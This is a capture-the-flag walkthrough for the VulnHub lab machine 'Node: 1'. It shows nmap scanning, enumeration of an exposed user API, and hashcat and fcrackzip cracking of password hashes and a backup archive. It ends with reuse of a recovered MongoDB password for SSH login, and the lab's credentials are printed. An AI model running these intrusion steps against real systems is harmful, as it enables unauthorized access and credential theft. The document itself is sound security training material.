:::::::::::::::::::::::: page
# Node: 1 {#node-1 .title}

\

## 

## Node: 1

- **[Node: 1]{style="color:#cdab8f;"}** :-

<!-- -->

- Download the machine : <https://www.vulnhub.com/entry/node-1,252/>

![](images/775-1.png)

- Open ova file .
- Then click finish .
- Start the machine .

1.  [Network Scanning]{style="color:#3f4043;"} :

- Find the machine IP :

::: codebox
    nmap -sn 192.168.2.0/24
:::

![](images/775-2.png)

- Run nmap master command :

::: codebox
    nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.229
:::

![](images/775-3.png)

- Find available port in the machine ( Optional ) :

::: codebox
    nmap -v -p- 192.168.2.229
:::

- 

::: codebox
    nmap -sC -sV -A 192.168.2.229
:::

- This command runs an aggressive scan and uses the http-enum script to
  identify potential CGI directories .

::: codebox
    nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.229
:::

1.  [Web Enumeration]{style="color:#3f4043;"} :

- IP visit in browser : <http://192.168.2.229:3000/>

<!-- -->

- View the source code :

![](images/775-4.png)

- Visit the parameter :

::: codebox
    http://192.168.2.229:3000/assets/js/app/controllers/home.js
:::

![](images/775-5.png)

- Visit the api parameter :

::: codebox
    http://192.168.2.229:3000/api/users
:::

![](images/775-6.png)

- Find username and password :

  Username              Password
  --------------------- ------------------------------------------------------------------
  myP14ceAdm1nAcc0uNT   dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af
  tom                   f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240
  mark                  de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73
  rastating             5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0

These look like SHA-256 .

- Now crack the hashes :

<!-- -->

- Make a file :

::: codebox
    vim hashes.txt
:::

- 
- Paste hashes :

::: codebox
    dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af
    f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240
    de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73
    5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0
:::

- Run the hashcat to crack password :

::: codebox
    hashcat -m 1400 hashes.txt /opt/rockyou.txt
:::

::: codebox
    myP14ceAdm1nAcc0uNT : manchester
    tom : spongebob
    mark : snowflake
:::

- Login the webpage :

::: codebox
    http://192.168.2.229:3000/login
:::

![](images/775-7.png)

- Now click Download Backup .

![](images/775-8.png)

- Decoded the backup :

::: codebox
    base64 -d myplace.backup > backup.zip
:::

- Verify :

::: codebox
    file backup.zip
:::

- Crack ZIP Password used fcrackzip with rockyou :

::: codebox
    fcrackzip -u -D -p /opt/rockyou.txt backup.zip
:::

- Password found :

::: codebox
    magicword
:::

- Extract ZIP Archive :

::: codebox
    unzip backup.zip
:::

![](images/775-9.png)

- Search MongoDB Credentials :

::: codebox
    grep -R "mongodb://" var/www/myplace/
:::

Found credential inside :

::: codebox
    const url = 'mongodb://mark:5AYRFt73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
:::

![](images/775-10.png)

1.  [SSH Access Using Reused Credentials]{style="color:#3f4043;"} :

::: codebox
    ssh mark@192.168.2.229
:::

Password :

::: codebox
    5AYRFt73VtFpc84k  
:::

![](images/775-11.png)
::::::::::::::::::::::::
